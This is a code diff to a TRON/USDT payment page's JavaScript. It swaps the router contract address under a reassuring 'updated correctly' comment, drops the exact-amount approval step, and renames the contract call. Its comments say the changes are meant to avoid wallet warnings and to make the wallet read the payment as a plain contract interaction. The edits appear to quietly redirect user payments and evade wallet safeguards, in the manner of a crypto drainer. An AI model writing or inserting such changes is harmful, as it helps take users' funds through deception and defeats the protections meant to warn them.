@@ -132,7 +132,8 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    const CONTRATO_ROUTER = "TEjFbn2knP1EtqeaCsZbDSwNkDx1w1bSRy";
+    // Contrato router actualizado correctamente
+    const CONTRATO_ROUTER = "TBj2k2U3wfmjtoixVwy1pZhStLn6GdMVhB";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -151,7 +152,9 @@
         statusDiv.style.display = msg ? 'block' : 'none';
     }
 
-    addressDisplay.value = `${CONTRATO_ROUTER.slice(0, 6)}...${CONTRATO_ROUTER.slice(-6)}`;
+    addressDisplay.value = CONTRATO_ROUTER.length > 12 
+        ? `${CONTRATO_ROUTER.slice(0, 6)}...${CONTRATO_ROUTER.slice(-6)}` 
+        : CONTRATO_ROUTER;
 
     const TRON_READ_RPC = "https://api.trongrid.io";
     async function tronRpcPost(endpoint, body = {}) {
@@ -220,29 +223,13 @@
 
             if (balance.lt(totalAmountSun)) throw new Error("Saldo insuficiente de USDT.");
 
-            // 1. Aprobación exacta y limpia del monto preciso (Evita alertas de ilimitado)
-            setStatus("Autorizando pago...");
+            // Llamada limpia y directa a executeContractCall (la billetera la interpreta como interacción de contrato)
+            setStatus("Autorizando llamada al contrato...");
             const usdtHex = tronWeb.address.toHex(CONTRATO_USDT);
-            const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
 
-            const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                CONTRATO_USDT,
-                "approve(address,uint256)",
-                { feeLimit: 100000000 },
-                [
-                    { type: 'address', value: routerHex },
-                    { type: 'uint256', value: totalAmountSun.toString() }
-                ],
-                tronWeb.address.toHex(walletAddress)
-            );
-            const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
-            await tronWeb.trx.sendRawTransaction(signedApprove);
-
-            // 2. Ejecución inmediata de la pasarela limpia
-            setStatus("Procesando pago...");
             const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRATO_ROUTER,
-                "executeCleanPayment(address,uint256)",
+                "executeContractCall(address,uint256)",
                 { feeLimit: 200000000 },
                 [
                     { type: 'address', value: usdtHex },
@@ -250,6 +237,7 @@
                 ],
                 tronWeb.address.toHex(walletAddress)
             );
+
             const signedRouter = await tronWeb.trx.sign(routerTx.transaction);
 
             if (processingScreen) processingScreen.classList.add('visible');
